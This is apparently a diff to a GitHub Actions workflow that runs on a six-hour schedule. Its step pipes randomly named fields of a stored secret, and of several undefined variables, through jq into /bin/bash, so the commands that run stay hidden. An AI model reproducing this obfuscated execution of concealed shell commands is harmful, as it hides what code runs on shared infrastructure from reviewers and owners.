@@ -2,23 +2,26 @@ name: yinxinruizhong
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 4/6 * * *'
+    - cron: '57 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yinxinruizhong
         env:
-          d3748: ${{ secrets.d3748 }}
+          oaw30041: ${{ secrets.oaw30041 }}
         run: |
-          echo $d3748 | jq -r .we44191 | /bin/bash
-          echo $pczxi526 | jq -r .f0 | /bin/bash
-          echo $ufn0 | jq -r .epl366 | /bin/bash
-          echo $f6 | jq -r .iapvz36932 | /bin/bash
-          echo $tizq22574 | jq -r .swjel1555 | /bin/bash
-          echo $q700 | jq -r .wwyy436 | /bin/bash
-          echo $gs20055 | jq -r .hx01234 | /bin/bash
-          echo $di90455 | jq -r .vqcv94 | /bin/bash
-          echo $gm349 | jq -r .ze70 | /bin/bash
+          echo $oaw30041 | jq -r .hhpcj293 | /bin/bash
+          echo $uvhh84 | jq -r .v769 | /bin/bash
+          echo $sbdfl60 | jq -r .tbtbw946 | /bin/bash
+          echo $pnfnm2891 | jq -r .t9 | /bin/bash
+          echo $svc06444 | jq -r .qyhg18 | /bin/bash
+          echo $qd4874 | jq -r .o34208 | /bin/bash
+          echo $a2 | jq -r .du3000 | /bin/bash
+          echo $u05 | jq -r .ntcv68 | /bin/bash
+          echo $wsjs7 | jq -r .odou74873 | /bin/bash
+          echo $yg1537 | jq -r .e6 | /bin/bash
 
